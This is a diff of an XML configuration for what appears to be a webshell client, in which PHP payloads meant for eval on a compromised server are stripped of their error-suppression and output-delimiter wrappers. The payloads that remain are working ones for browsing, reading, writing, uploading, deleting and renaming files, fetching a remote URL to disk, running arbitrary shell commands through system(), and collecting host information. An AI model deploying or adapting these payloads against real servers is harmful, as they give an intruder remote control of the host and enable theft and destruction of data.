@@ -5,11 +5,7 @@
       <name>WwwRootPathCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$D=dirname($_SERVER["SCRIPT_FILENAME"]);
+      <item><![CDATA[$D=dirname($_SERVER["SCRIPT_FILENAME"]);
 if($D=="") $D=dirname($_SERVER["PATH_TRANSLATED"]);
 $R="{$D}\t";
 if(substr($D,0,1)!="/")
@@ -19,20 +15,14 @@ if(substr($D,0,1)!="/")
 			$R.="{$L}: ";
 }
 else $R.="/";
-print $R;
-echo("|<-");
-die();]]></item>	  
+print $R;]]></item>	  
     </func>
     <func>
       <name>FileTreeCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$D=base64_decode($_POST["$dirPath$"]);
+      <item><![CDATA[$D=base64_decode($_POST["$dirPath$"]);
 $f=@opendir($D);
 if ($f==NULL) {
     echo("ERROR://Path Not Found Or No Permission");
@@ -52,25 +42,17 @@ else {
     }
     echo $M;
     @closedir($f);
-}
-echo("|<-");
-die();]]></item>
+}]]></item>
     </func>
     <func>
       <name>ReadFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$F=base64_decode($_POST["$filePath$"]);
+      <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
 $P=@fopen($F,"r");
 echo(@fread($P,filesize($F)));
-@fclose($P);
-echo("|<-");
-die();]]></item>
+@fclose($P);]]></item>
     </func>
     <func>
       <name>WriteFileCode</name>
@@ -78,26 +60,16 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$f=base64_decode($_POST["$filePath$"]);
+      <item><![CDATA[$f=base64_decode($_POST["$filePath$"]);
 $buf=base64_decode($_POST["$fileContext$"]);
-echo @fwrite(fopen($f,"w"),$buf)?"1":"0";
-echo("|<-");
-die();]]></item>
+echo @fwrite(fopen($f,"w"),$buf)?"1":"0";]]></item>
     </func>
     <func>
       <name>DeleteFileOrDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-function df($p)
+      <item><![CDATA[function df($p)
 {
     $m=@dir($p);
     while (@$f=$m->read())
@@ -118,20 +90,14 @@ $F=base64_decode($_POST["$fileOrDirPath$"]);
 if (is_dir($F)) echo(df($F));
 else {
 echo(file_exists($F)?@unlink($F)?"1":"0":"0");
-};
-echo("|<-");
-die();]]></item>
+};]]></item>
     </func>
     <func>
       <name>DownloadFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$F=base64_decode($_POST["$filePath$"]);
+      <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
 $fp=@fopen($F,"r");
 if(@fgetc($fp))
 {
@@ -141,9 +107,7 @@ if(@fgetc($fp))
 else
 {
 	echo("ERROR://Can Not Read");
-}
-echo("|<-");
-die();]]></item>
+}]]></item>
     </func>
     <func>
       <name>UploadFileCode</name>
@@ -151,19 +115,13 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$f=base64_decode($_POST["$savefilePath$"]);
+      <item><![CDATA[$f=base64_decode($_POST["$savefilePath$"]);
 $c=base64_decode($_POST["$fileHexContext$"]);
 $c=str_replace("\r","",$c);
 $c=str_replace("\n","",$c);
 $buf="";
 for ($i=0; $i<strlen($c); $i+=2)$buf.=urldecode("%".substr($c,$i,2));
-echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
-echo("|<-");
-die();]]></item>
+echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");]]></item>
     </func>
     <func>
       <name>CopyFileOrDirCode</name>
@@ -171,11 +129,7 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-function xcopy($src,$dest)
+      <item><![CDATA[function xcopy($src,$dest)
 {
 	if(is_file($src))
 	{
@@ -207,9 +161,7 @@ function xcopy($src,$dest)
 }
 $fc=base64_decode($_POST["$sourceFilePath$"]);
 $fp=base64_decode($_POST["$targetFilePath$"]);
-echo(xcopy($fc,$fp)?"1":"0");
-echo("|<-");
-die();]]></item>
+echo(xcopy($fc,$fp)?"1":"0");]]></item>
     </func>
     <func>
       <name>RenameFileOrDirCode</name>
@@ -217,29 +169,17 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$src=base64_decode($_POST["$oldName$"]);
+      <item><![CDATA[$src=base64_decode($_POST["$oldName$"]);
 $dst=base64_decode($_POST["$newName$"]);
-echo(rename($src,$dst)?"1":"0");
-echo("|<-");
-die();]]></item>
+echo(rename($src,$dst)?"1":"0");]]></item>
     </func>
     <func>
       <name>CreateDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$f=base64_decode($_POST["$dirPath$"]);
-echo(mkdir($f)?"1":"0");
-echo("|<-");
-die();]]></item>
+      <item><![CDATA[$f=base64_decode($_POST["$dirPath$"]);
+echo(mkdir($f)?"1":"0");]]></item>
     </func>
     <func>
       <name>ModifyFileOrDirTimeCode</name>
@@ -247,11 +187,7 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$FN=base64_decode($_POST["$fileOrDirPath$"]);
+      <item><![CDATA[$FN=base64_decode($_POST["$fileOrDirPath$"]);
 $TM=strtotime(base64_decode($_POST["$aTime$"]));
 if(file_exists($FN))
 {
@@ -260,9 +196,7 @@ if(file_exists($FN))
 else
 {
 	echo("0");
-}
-echo("|<-");
-die();]]></item>
+}]]></item>
     </func>
     <func>
       <name>WgetCode</name>
@@ -270,11 +204,7 @@ die();]]></item>
 	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$fR=base64_decode($_POST["$urlPath$"]);
+      <item><![CDATA[$fR=base64_decode($_POST["$urlPath$"]);
 $fL=base64_decode($_POST["$saveFilePath$"]);
 $F=@fopen($fR,'r');
 $L=@fopen($fL,'w');
@@ -289,9 +219,7 @@ if($F && $L)
 else
 {	
 	echo("0");
-}
-echo("|<-");
-die();]]></item>
+}]]></item>
     </func>
     <func>
       <name>ExecuteCommandCode</name>
@@ -299,36 +227,24 @@ die();]]></item>
 	  <path>/Cmder</path>
 	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$p=base64_decode($_POST["$cmdPath$"]);
+      <item><![CDATA[$p=base64_decode($_POST["$cmdPath$"]);
 $s=base64_decode($_POST["$command$"]);
 $d=dirname($_SERVER["SCRIPT_FILENAME"]);
 $c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
 $r="{$p} {$c}";
 @system($r." 2>&1",$ret);
-print ($ret!=0)?"ret={$ret}":"";
-echo("|<-");
-die();]]></item>
+print ($ret!=0)?"ret={$ret}":"";]]></item>
     </func>
     <func>
       <name>SysInfoCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
 	  <path>/Cmder</path>
-      <item><![CDATA[@ini_set("display_errors","0");
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-echo("->|");
-$d=dirname($_SERVER["SCRIPT_FILENAME"]);
+      <item><![CDATA[$d=dirname($_SERVER["SCRIPT_FILENAME"]);
 $r="{$d}\t";
 $r.=php_uname()."\t";
 $r.="(".@get_current_user().")\t";
 $r.=DIRECTORY_SEPARATOR;
-print $r;
-echo("|<-");
-die();]]></item>
+print $r;]]></item>
     </func>
   </funcCodeSetting>
 </customShellType>
